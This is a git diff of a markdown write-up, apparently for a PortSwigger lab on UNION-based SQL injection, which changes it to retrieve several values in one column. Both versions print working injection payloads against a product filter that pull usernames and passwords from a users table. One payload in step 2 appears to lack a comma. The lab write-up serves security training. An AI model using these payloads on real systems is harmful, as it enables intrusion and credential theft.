@@ -1,7 +1,7 @@
-# SQL Injection - UNION Attack: Retrieve Data
+# SQL Injection - UNION Attack: Retrieve Multiple Values in a Single Column
 
 ## Goal:
-This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
 
 The database contains a different table called `users`, with columns called `username` and `password`.
 
@@ -13,33 +13,34 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 
 ### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
 ```http
-GET /filter?categoyy=Corporate+gifts HTTP/2
+GET /filter?category=Gifts HTTP/2
 ```
 
 ### 2. Modified the Request to Determine Column Count
 
-```http
-GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL-- HTTP/2
-Response: HTTP/2 200 OK
+```sql
+' UNION SELECT NULL NULL--
 ```
+Response: HTTP/2 200 OK
 
 ### 3. Identified Column Accepting String Output
-```http
-GET /filter?category=Corporate+gifts'+UNION+SELECT+'a',NULL-- HTTP/2
-Response: HTTP/2 200 OK
 
-GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,'a'-- HTTP/2
-Response: HTTP/2 200 OK
-
-GET /filter?category=Corporate+gifts'+UNION+SELECT+'a','a'-- HTTP/2
-Response: HTTP/2 200 OK
+```sql
+' UNION SELECT 'a',NULL--
 ```
+Response: HTTP/2 500 Internal Server
+
+```sql
+' UNION SELECT NULL,'a'--
+```
+Response: HTTP/2 200 OK
 
 ### 4. Retrieved Data from Users Table
-```http
-GET /filter?category=Corporate+gifts'+UNION+SELECT+username,password+FROM+users-- HTTP/2
+
+```sql
+' UNION SELECT NULL,username||'~'||password FROM users--
 ```
-![burpsuite response](./misc-images/05-1.png)
+![burpsuite response](./misc-images/06-1.png)
 
 This retrieved all usernames and passwords including the administrator.
 
@@ -61,7 +62,7 @@ Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-wher
 
 ## Reflection
 
-Learned how to retrieve data from other column using UNION-based SQL injection.
+Learned how to retrieve multiple values in a single column using UNION-based SQL injection.
 
 ---
 
